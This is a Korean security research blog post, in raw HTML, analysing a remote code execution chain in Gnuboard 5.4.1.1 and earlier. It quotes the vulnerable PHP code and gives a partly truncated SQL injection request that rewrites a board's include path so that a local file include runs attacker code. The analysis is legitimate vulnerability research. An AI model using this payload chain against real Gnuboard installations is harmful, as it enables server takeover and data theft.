<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta property="og:type" content="article">
<meta property="og:image" content="http://ufo.stealien.com/assets/og_image.png">
<meta property="og:title" content="STEALIEN Technical Blog">
<meta property="og:description" content="Gnuboard <= 5.4.1.1 RCE">
<link href="https://fonts.googleapis.com/css?family=Nunito+Sans:400,400i,700&display=swap" rel="stylesheet">
<title>Gnuboard <= 5.4.1.1 RCE</title>
<!-- Begin Jekyll SEO tag v2.7.1 -->
<title>Gnuboard &lt;= 5.4.1.1 RCE | STEALIEN Technical Blog</title>
<meta name="generator" content="Jekyll v4.2.0" />
<meta property="og:title" content="Gnuboard &lt;= 5.4.1.1 RCE" />
<meta name="author" content="이예랑" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Gnuboard &lt;= 5.4.1.1 RCE 스틸리언 선임연구원 이예랑(yelang123)" />
<meta property="og:description" content="Gnuboard &lt;= 5.4.1.1 RCE 스틸리언 선임연구원 이예랑(yelang123)" />
<link rel="canonical" href="http://ufo.stealien.com/2021-02-08/Gnuboard-RCE" />
<meta property="og:url" content="http://ufo.stealien.com/2021-02-08/Gnuboard-RCE" />
<meta property="og:site_name" content="STEALIEN Technical Blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-02-08T16:00:00+09:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Gnuboard &lt;= 5.4.1.1 RCE" />
<script type="application/ld+json">
{"@type":"BlogPosting","headline":"Gnuboard &lt;= 5.4.1.1 RCE","url":"http://ufo.stealien.com/2021-02-08/Gnuboard-RCE","datePublished":"2021-02-08T16:00:00+09:00","dateModified":"2021-02-08T16:00:00+09:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://ufo.stealien.com/2021-02-08/Gnuboard-RCE"},"author":{"@type":"Person","name":"이예랑"},"description":"Gnuboard &lt;= 5.4.1.1 RCE 스틸리언 선임연구원 이예랑(yelang123)","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name=“naver-site-verification” content=“74a9ec74d48a1ffca92bf9ac4704ba73be9afd65" />
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous"/>
<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
<link rel="stylesheet" href="/assets/css/style.css">

<link href="https://fonts.googleapis.com/css2?family=Nanum+Gothic:wght@400;700;800&display=swap" rel="stylesheet">

<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.0.3/styles/default.min.css">
<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.0.3/highlight.min.js"></script>

<link href="/assets/css/syntax.css" rel="stylesheet" >
</head>
<body>
	<header>
		<div class="container"></div>---
lang: ko
---
<div id="header">
    <div class="container" style="display: flex;justify-content: space-between;">
        <a href="/">
            <img
                class="header_image_logo"
                src="/assets/logo.png"
                style="width: 140px; margin: 20px 28px 0px;"
            />
        </a>
        <a href="https://www.stealien.com/" target="_blank" style="font-family: 'NotoSansKR Medium', sans-serif;font-size: 14px;margin-right: 30px; color: #000; line-height: 70px;">스틸리언 홈페이지</a>
    </div>
</div></header>
	<section>
		<div>
			<div class="header_image_bg header_image_post" style="background-image: url('/assets/bg.png');">
    <div class="header_image_post_body">
        <div class="container">
            <div class="page-category">R&D</div>
            <div class="page-title">Gnuboard <= 5.4.1.1 RCE</div>
            <div class="page-summary">
                <div style="float:left;">
                    <img class="page-profile_image" src="/assets/2021-02-08-Gnuboard-RCE/profile.jpg" />
                    <span>이예랑</span>
                </div>
                <div style="float:right;" class="page-date">Feb 8, 2021</div>
            </div>
        </div>
    </div>
</div>
<div class="container page-content">
    <h1 id="gnuboard--5411-rce">Gnuboard &lt;= 5.4.1.1 RCE</h1>
<p>스틸리언 선임연구원 이예랑(yelang123)</p>

<h2 id="개요">개요</h2>
<p>본 글에서는 찾은 뒤 제보하지 않아 잠수함 패치 된 <code class="language-plaintext highlighter-rouge">Gnuboard</code> 취약점의 대한 내용을 다룬다. 
해당 취약점은 관리자 페이지가 없어도 RCE가 가능하며 <code class="language-plaintext highlighter-rouge">Gnuboard</code> 게시판 관리자 이상의 권한에서 터지는 취약점이다.
보통 <code class="language-plaintext highlighter-rouge">Gnuboard</code>를 사용하는 실제 서비스에서 관리자 페이지의 취약점 등의 이유로 인하여 관리자 페이지의 경로를 바꾸거나 기타 다른 조치를 취하여 공격에 대해 사전에 방지한다.
해당 취약점을 이용하면 관리자 페이지의 경로를 모르거나 접근이 불가능 한 경우에도 RCE가 가능하다.</p>

<h2 id="1-sql-injection">1. SQL Injection</h2>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'bo_table'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$bo_table</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/[^a-z0-9_]/i'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'bo_table'</span><span class="p">]));</span>
    <span class="nv">$bo_table</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$bo_table</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">20</span><span class="p">);</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nv">$bo_table</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>우선 <code class="language-plaintext highlighter-rouge">Gnuboard</code> 는 <code class="language-plaintext highlighter-rouge">common.php 392 line</code> 에서 위와 같이 GET,POST 의 ‘bo_table’ 파라미터의 데이터를 정규식으로 replace 한 뒤 글자수를 20 글자로 잘라 사용자의 입력을 제한한다.
위의 내용으로 인해 일반적인 방법으로 bo_table 파라미터를 이용한 SQL Injection은 불가능하다.
하지만 아래의 경우 이런 동작을 우회 할 수 있다.</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'chk_bn_id'</span><span class="p">]);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">// 실제 번호를 넘김</span>
    <span class="nv">$k</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'chk_bn_id'</span><span class="p">][</span><span class="nv">$i</span><span class="p">];</span>
    <span class="nv">$bo_table</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'bo_table'</span><span class="p">][</span><span class="nv">$k</span><span class="p">];</span>
    <span class="nv">$wr_id</span>    <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'wr_id'</span><span class="p">][</span><span class="nv">$k</span><span class="p">];</span>
    <span class="nv">$save_bo_table</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$bo_table</span><span class="p">;</span>
    <span class="nv">$write_table</span> <span class="o">=</span> <span class="nv">$g5</span><span class="p">[</span><span class="s1">'write_prefix'</span><span class="p">]</span><span class="mf">.</span><span class="nv">$bo_table</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$board</span><span class="p">[</span><span class="s1">'bo_table'</span><span class="p">]</span> <span class="o">!=</span> <span class="nv">$bo_table</span><span class="p">)</span>
        <span class="nv">$board</span> <span class="o">=</span> <span class="nf">sql_fetch</span><span class="p">(</span><span class="s2">" select bo_subject, bo_write_point, bo_comment_point, bo_notice from </span><span class="si">{</span><span class="nv">$g5</span><span class="p">[</span><span class="s1">'board_table'</span><span class="p">]</span><span class="si">}</span><span class="s2"> where bo_table = '</span><span class="nv">$bo_table</span><span class="s2">' "</span><span class="p">);</span>
    <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">" select * from </span><span class="nv">$write_table</span><span class="s2"> where wr_id = '</span><span class="nv">$wr_id</span><span class="s2">' "</span><span class="p">;</span>
    <span class="nv">$write</span> <span class="o">=</span> <span class="nf">sql_fetch</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$write</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">/bbs/new_delete.php 12~29 line</code> 에서 ‘chk_bn_id’ 파라미터를 count하여 반복문을 통해 SELECT 하는것을 볼수 있다.
 방어기법이 적용된 입력값은 $bo_table에 적용된 반면에 이 코드에서 사용하고 있는 변수는 $_POST[‘bo_table’]의 값을 가져와 <code class="language-plaintext highlighter-rouge">$bo_table</code>을 재정의 하기 때문에 <code class="language-plaintext highlighter-rouge">common.php</code>의 방어 코드는 실행되지 않는다.
 따라서 SQL Injection이 가능하다.</p>

<h2 id="2-local-file-inclusion">2. Local FIle Inclusion</h2>
<p>PHP 에서 Local File Inclusion 은 <code class="language-plaintext highlighter-rouge">include,require,include_once,require_once</code> 등의 함수의 인자를 다음과 같이 User input에서 컨트롤이 가능하다면 발생하는 취약점이다.</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nv">$input</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
<span class="k">include</span> <span class="nv">$input</span><span class="p">;</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>
<p>위와 같은 코드가 존재한다면 include 함수에서는 확장자의 영향을 받지 않기 때문에 파일의 내용을 쓸수 있는 경우 등 상황에 따라 RCE 가 가능하다.</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">defined</span><span class="p">(</span><span class="s1">'_GNUBOARD_'</span><span class="p">))</span> <span class="k">exit</span><span class="p">;</span> <span class="c1">// 개별 페이지 접근 불가</span>
<span class="c1">// 게시판 관리의 상단 내용</span>
<span class="k">if</span> <span class="p">(</span><span class="no">G5_IS_MOBILE</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// 모바일의 경우 설정을 따르지 않는다.</span>
    <span class="k">include_once</span><span class="p">(</span><span class="no">G5_BBS_PATH</span><span class="mf">.</span><span class="s1">'/_head.php'</span><span class="p">);</span>
    <span class="k">echo</span> <span class="nf">html_purifier</span><span class="p">(</span><span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$board</span><span class="p">[</span><span class="s1">'bo_mobile_content_head'</span><span class="p">]));</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="nf">is_include_path_check</span><span class="p">(</span><span class="nv">$board</span><span class="p">[</span><span class="s1">'bo_include_head'</span><span class="p">]))</span> <span class="p">{</span>  <span class="c1">//파일경로 체크</span>
        <span class="o">@</span><span class="k">include</span> <span class="p">(</span><span class="nv">$board</span><span class="p">[</span><span class="s1">'bo_include_head'</span><span class="p">]);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>    <span class="c1">//파일경로가 올바르지 않으면 기본파일을 가져옴</span>
        <span class="k">include_once</span><span class="p">(</span><span class="no">G5_BBS_PATH</span><span class="mf">.</span><span class="s1">'/_head.php'</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="nf">html_purifier</span><span class="p">(</span><span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$board</span><span class="p">[</span><span class="s1">'bo_content_head'</span><span class="p">]));</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">/bbs/board_head.php 1~17 line</code> 을 보면 모바일 인지 체크 후  <code class="language-plaintext highlighter-rouge">$board['bo_include_head']</code> 의 값을 인자로 받아 include 함수를 실행한다.</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$write</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="nv">$write_table</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$bo_table</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$board</span> <span class="o">=</span> <span class="nf">get_board_db</span><span class="p">(</span><span class="nv">$bo_table</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$board</span><span class="p">[</span><span class="s1">'bo_table'</span><span class="p">])</span> <span class="p">{</span>
        <span class="nf">set_cookie</span><span class="p">(</span><span class="s2">"ck_bo_table"</span><span class="p">,</span> <span class="nv">$board</span><span class="p">[</span><span class="s1">'bo_table'</span><span class="p">],</span> <span class="mi">86400</span> <span class="o">*</span> <span class="mi">1</span><span class="p">);</span>
        <span class="nv">$gr_id</span> <span class="o">=</span> <span class="nv">$board</span><span class="p">[</span><span class="s1">'gr_id'</span><span class="p">];</span>
        <span class="nv">$write_table</span> <span class="o">=</span> <span class="nv">$g5</span><span class="p">[</span><span class="s1">'write_prefix'</span><span class="p">]</span> <span class="mf">.</span> <span class="nv">$bo_table</span><span class="p">;</span> <span class="c1">// 게시판 테이블 전체이름</span>
        <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$wr_id</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$wr_id</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$write</span> <span class="o">=</span> <span class="nf">get_write</span><span class="p">(</span><span class="nv">$write_table</span><span class="p">,</span> <span class="nv">$wr_id</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$wr_seo_title</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$wr_seo_title</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$write</span> <span class="o">=</span> <span class="nf">get_content_by_field</span><span class="p">(</span><span class="nv">$write_table</span><span class="p">,</span> <span class="s1">'bbs'</span><span class="p">,</span> <span class="s1">'wr_seo_title'</span><span class="p">,</span> <span class="nf">generate_seo_title</span><span class="p">(</span><span class="nv">$wr_seo_title</span><span class="p">));</span>
            <span class="k">if</span><span class="p">(</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$write</span><span class="p">[</span><span class="s1">'wr_id'</span><span class="p">])</span> <span class="p">){</span>
                <span class="nv">$wr_id</span> <span class="o">=</span> <span class="nv">$write</span><span class="p">[</span><span class="s1">'wr_id'</span><span class="p">];</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">/common.php 415~433 line</code> 을 보면 <code class="language-plaintext highlighter-rouge">get_board_db</code> 함수의 return 값을 $board 변수에 저장하고 그 후 다른 변수들의 값을 저장하는데 <code class="language-plaintext highlighter-rouge">get_board_db</code> 함수의 정의는 다음과 같다.</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">get_board_db</span><span class="p">(</span><span class="nv">$bo_table</span><span class="p">,</span> <span class="nv">$is_cache</span><span class="o">=</span><span class="kc">false</span><span class="p">){</span>
    <span class="k">global</span> <span class="nv">$g5</span><span class="p">;</span>
    <span class="k">static</span> <span class="nv">$cache</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
    <span class="nv">$cache</span> <span class="o">=</span> <span class="nf">run_replace</span><span class="p">(</span><span class="s1">'get_board_db_cache'</span><span class="p">,</span> <span class="nv">$cache</span><span class="p">,</span> <span class="nv">$bo_table</span><span class="p">,</span> <span class="nv">$is_cache</span><span class="p">);</span>
    <span class="nv">$key</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$bo_table</span><span class="p">);</span>
    <span class="nv">$bo_table</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/[^a-z0-9_]/i'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$bo_table</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span> <span class="nv">$is_cache</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$cache</span><span class="p">[</span><span class="nv">$key</span><span class="p">])</span> <span class="p">){</span>
        <span class="k">return</span> <span class="nv">$cache</span><span class="p">[</span><span class="nv">$key</span><span class="p">];</span>
    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="p">(</span><span class="nv">$cache</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nf">run_replace</span><span class="p">(</span><span class="s1">'get_board_db'</span><span class="p">,</span> <span class="k">array</span><span class="p">(),</span> <span class="nv">$bo_table</span><span class="p">))</span> <span class="p">){</span>
        <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">" select * from </span><span class="si">{</span><span class="nv">$g5</span><span class="p">[</span><span class="s1">'board_table'</span><span class="p">]</span><span class="si">}</span><span class="s2"> where bo_table = '</span><span class="nv">$bo_table</span><span class="s2">' "</span><span class="p">;</span>
        <span class="nv">$cache</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nf">sql_fetch</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$cache</span><span class="p">[</span><span class="nv">$key</span><span class="p">];</span>
<span class="p">}</span>
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">/lib/get_data_lib.php 68~91 line</code> 을 보면 해당 함수는 <code class="language-plaintext highlighter-rouge">$bo_table</code> 을 인자로 받아 <code class="language-plaintext highlighter-rouge">g5_board</code> 테이블에서 select 해 그 결과를 변수에 저장한다.
따라서 <code class="language-plaintext highlighter-rouge">g5_board.bo_include_head</code> 필드의 내용을 실행하고 싶은 PHP 코드가 담긴 파일경로로 변경하면 RCE를 진행 할 수있다는 것이다.</p>
<h2 id="3-exploit">3. Exploit</h2>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'chk_bn_id'</span><span class="p">]);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">// 실제 번호를 넘김</span>
    <span class="nv">$k</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'chk_bn_id'</span><span class="p">][</span><span class="nv">$i</span><span class="p">];</span>
    <span class="nv">$bo_table</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'bo_table'</span><span class="p">][</span><span class="nv">$k</span><span class="p">];</span>
    <span class="nv">$wr_id</span>    <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'wr_id'</span><span class="p">][</span><span class="nv">$k</span><span class="p">];</span>
    <span class="nv">$save_bo_table</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$bo_table</span><span class="p">;</span>
    <span class="nv">$write_table</span> <span class="o">=</span> <span class="nv">$g5</span><span class="p">[</span><span class="s1">'write_prefix'</span><span class="p">]</span><span class="mf">.</span><span class="nv">$bo_table</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$board</span><span class="p">[</span><span class="s1">'bo_table'</span><span class="p">]</span> <span class="o">!=</span> <span class="nv">$bo_table</span><span class="p">)</span>
        <span class="nv">$board</span> <span class="o">=</span> <span class="nf">sql_fetch</span><span class="p">(</span><span class="s2">" select bo_subject, bo_write_point, bo_comment_point, bo_notice from </span><span class="si">{</span><span class="nv">$g5</span><span class="p">[</span><span class="s1">'board_table'</span><span class="p">]</span><span class="si">}</span><span class="s2"> where bo_table = '</span><span class="nv">$bo_table</span><span class="s2">' "</span><span class="p">);</span>
    <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">" select * from </span><span class="nv">$write_table</span><span class="s2"> where wr_id = '</span><span class="nv">$wr_id</span><span class="s2">' "</span><span class="p">;</span>
    <span class="nv">$write</span> <span class="o">=</span> <span class="nf">sql_fetch</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$write</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
    <span class="c1">// 원글 삭제</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$write</span><span class="p">[</span><span class="s1">'wr_is_comment'</span><span class="p">]</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$len</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$write</span><span class="p">[</span><span class="s1">'wr_reply'</span><span class="p">]);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$len</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="nv">$len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="nv">$reply</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$write</span><span class="p">[</span><span class="s1">'wr_reply'</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$len</span><span class="p">);</span>
        <span class="c1">// 나라오름님 수정 : 원글과 코멘트수가 정상적으로 업데이트 되지 않는 오류를 잡아 주셨습니다.</span>
        <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">" select wr_id, mb_id, wr_is_comment from </span><span class="nv">$write_table</span><span class="s2"> where wr_parent = '</span><span class="si">{</span><span class="nv">$write</span><span class="p">[</span><span class="s1">'wr_id'</span><span class="p">]</span><span class="si">}</span><span class="s2">' order by wr_id "</span><span class="p">;</span>
        <span class="nv">$result</span> <span class="o">=</span> <span class="nf">sql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
        <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nf">sql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span>
        <span class="p">{</span> 
            <span class="c1">// 원글이라면</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'wr_is_comment'</span><span class="p">])</span>
            <span class="p">{</span>
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">/bbs/new_delete.php 11~44 line</code> 을 보면 <code class="language-plaintext highlighter-rouge">$write_table</code> 변수의 저장된 값을 이용해 select 하여 1차 적인 select 에서의 SQL Injection이 가능하다. 
하지만 <code class="language-plaintext highlighter-rouge">RCE</code> 를 위한 <code class="language-plaintext highlighter-rouge">g5_board</code> 테이블의 값을 변조해야 하기 때문에 update clause 에서 SQL Injection 이 있어야 했고,  방법을 다음 코드에서 발견했다.</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">else</span> <span class="c1">// 코멘트 삭제</span>
    <span class="p">{</span>
        <span class="c1">//--------------------------------------------------------------------</span>
        <span class="c1">// 코멘트 삭제시 답변 코멘트 까지 삭제되지는 않음</span>
        <span class="c1">//--------------------------------------------------------------------</span>
        <span class="c1">//print_r2($write);</span>
        <span class="nv">$comment_id</span> <span class="o">=</span> <span class="nv">$wr_id</span><span class="p">;</span>
        <span class="nv">$len</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$write</span><span class="p">[</span><span class="s1">'wr_comment_reply'</span><span class="p">]);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$len</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="nv">$len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="nv">$comment_reply</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$write</span><span class="p">[</span><span class="s1">'wr_comment_reply'</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$len</span><span class="p">);</span>
        <span class="c1">// 코멘트 삭제</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">delete_point</span><span class="p">(</span><span class="nv">$write</span><span class="p">[</span><span class="s1">'mb_id'</span><span class="p">],</span> <span class="nv">$bo_table</span><span class="p">,</span> <span class="nv">$comment_id</span><span class="p">,</span> <span class="s1">'코멘트'</span><span class="p">))</span> <span class="p">{</span>
            <span class="nf">insert_point</span><span class="p">(</span><span class="nv">$write</span><span class="p">[</span><span class="s1">'mb_id'</span><span class="p">],</span> <span class="nv">$board</span><span class="p">[</span><span class="s1">'bo_comment_point'</span><span class="p">]</span> <span class="o">*</span> <span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">),</span> <span class="s2">"</span><span class="si">{</span><span class="nv">$board</span><span class="p">[</span><span class="s1">'bo_subject'</span><span class="p">]</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="nv">$write</span><span class="p">[</span><span class="s1">'wr_parent'</span><span class="p">]</span><span class="si">}</span><span class="s2">-</span><span class="si">{</span><span class="nv">$comment_id</span><span class="si">}</span><span class="s2"> 코멘트삭제"</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="c1">// 코멘트 삭제</span>
        <span class="nf">sql_query</span><span class="p">(</span><span class="s2">" delete from </span><span class="nv">$write_table</span><span class="s2"> where wr_id = '</span><span class="nv">$comment_id</span><span class="s2">' "</span><span class="p">);</span>
        <span class="c1">// 코멘트가 삭제되므로 해당 게시물에 대한 최근 시간을 다시 얻는다.</span>
        <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">" select max(wr_datetime) as wr_last from </span><span class="nv">$write_table</span><span class="s2"> where wr_parent = '</span><span class="si">{</span><span class="nv">$write</span><span class="p">[</span><span class="s1">'wr_parent'</span><span class="p">]</span><span class="si">}</span><span class="s2">' "</span><span class="p">;</span>
        <span class="nv">$row</span> <span class="o">=</span> <span class="nf">sql_fetch</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
        <span class="c1">// 원글의 코멘트 숫자를 감소</span>
        <span class="nf">sql_query</span><span class="p">(</span><span class="s2">" update </span><span class="nv">$write_table</span><span class="s2"> set wr_comment = wr_comment - 1, wr_last = '</span><span class="si">{</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'wr_last'</span><span class="p">]</span><span class="si">}</span><span class="s2">' where wr_id = '</span><span class="si">{</span><span class="nv">$write</span><span class="p">[</span><span class="s1">'wr_parent'</span><span class="p">]</span><span class="si">}</span><span class="s2">' "</span><span class="p">);</span>
        <span class="c1">// 코멘트 숫자 감소</span>
        <span class="nf">sql_query</span><span class="p">(</span><span class="s2">" update </span><span class="si">{</span><span class="nv">$g5</span><span class="p">[</span><span class="s1">'board_table'</span><span class="p">]</span><span class="si">}</span><span class="s2"> set bo_count_comment = bo_count_comment - 1 where bo_table = '</span><span class="nv">$bo_table</span><span class="s2">' "</span><span class="p">);</span>
        <span class="c1">// 새글 삭제</span>
        <span class="nf">sql_query</span><span class="p">(</span><span class="s2">" delete from </span><span class="si">{</span><span class="nv">$g5</span><span class="p">[</span><span class="s1">'board_new_table'</span><span class="p">]</span><span class="si">}</span><span class="s2"> where bo_table = '</span><span class="nv">$bo_table</span><span class="s2">' and wr_id = '</span><span class="nv">$comment_id</span><span class="s2">' "</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">/bbs/new_delete.php 104~137 line</code>  을 보면 <code class="language-plaintext highlighter-rouge">$write</code> 변수
<code class="language-plaintext highlighter-rouge">sw=move&amp;page=1&amp;pressed=선택내용삭제&amp;chk_bn_id[]=0&amp;bo_table[0]=free as a join g5_board as b #&amp;wr_id[0]=
where 1=0 union select (생략)-- -</code>
이와 같은 내용의 request 를 전송하면 다음과 같은 query 가 실행된다.
<code class="language-plaintext highlighter-rouge">1차 query</code></p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">string</span><span class="p">(</span><span class="mi">51</span><span class="p">)</span> <span class="s2">" select * from g5_write_free as a join g5_board as b# where wr_id = '
union select .....(생략) #' "</span>
</code></pre></div></div>
